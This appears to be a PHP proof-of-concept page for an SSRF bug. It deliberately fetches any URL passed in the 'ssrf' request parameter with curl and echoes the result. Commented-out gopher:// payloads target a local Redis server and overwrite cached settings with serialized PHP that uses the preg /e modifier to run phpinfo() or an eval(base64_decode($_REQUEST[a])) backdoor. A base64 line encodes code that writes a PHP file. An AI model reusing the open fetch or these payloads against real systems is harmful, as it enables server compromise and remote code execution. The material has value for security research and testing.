<?php
#$url = "gopher://127.0.0.1:6379/xset name cheng%0D%0Aquit";

#$exp = "gopher://127.0.0.1:6379/_eval \"local t=redis.call('keys','*_setting');for i,v in ipairs(t) do redis.call('set',v,'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";s:5:\\\"/.*/e\\\";}s:7:\\\"replace\\\";a:1:{s:7:\\\"plugins\\\";s:10:\\\"phpinfo();\\\";}}}s:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}') end;return 1;\" 0 %0D%0Aquit";
#$exp2 = "gopher://127.0.0.1:6379/_eval \"local t=redis.call('keys','*_setting');for i,v in ipairs(t) do redis.call('set',v,'a:2:{s:6:\\\"output\\\";a:1:{s:4:\\\"preg\\\";a:2:{s:6:\\\"search\\\";a:1:{s:7:\\\"plugins\\\";s:5:\\\"/.*/e\\\";}s:7:\\\"replace\\\";a:1:{s:7:\\\"plugins\\\";s:34:\\\"eval(base64_decode(\$_REQUEST[a]));\\\";}}}s:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}') end;return 1;\" 0 %0D%0Aquit";
##ZmlsZV9wdXRfY29udGVudHMoInhiLnBocCIsIjw/cGhwIHBocGluZm8oKTs/PiIpO3BocGluZm8oKTs=
echo "<h1>welcome to this page </h1><br>";
echo "<h5>it's just used to verify the bug</h5>";
$ch = curl_init();
$url = $_REQUEST['ssrf'];
echo $url."<br>";

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);

$output = curl_exec($ch);
curl_close($ch);
print_r($output);


?>
